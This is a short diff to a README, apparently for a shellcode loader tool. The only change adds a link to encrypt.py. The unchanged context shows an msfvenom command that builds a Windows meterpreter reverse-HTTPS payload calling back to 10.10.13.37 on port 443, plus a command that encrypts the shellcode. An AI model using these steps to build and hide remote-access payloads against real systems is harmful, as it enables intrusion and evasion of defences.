@@ -38,7 +38,7 @@ Features:
 ~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
 ```
 
-3. Encrypt the shellcode:
+3. [Encrypt](encrypt.py) the shellcode:
 
 ```console
 ~$ encrypt.py shellcode.bin -p 'Passw0rd!' -o enc
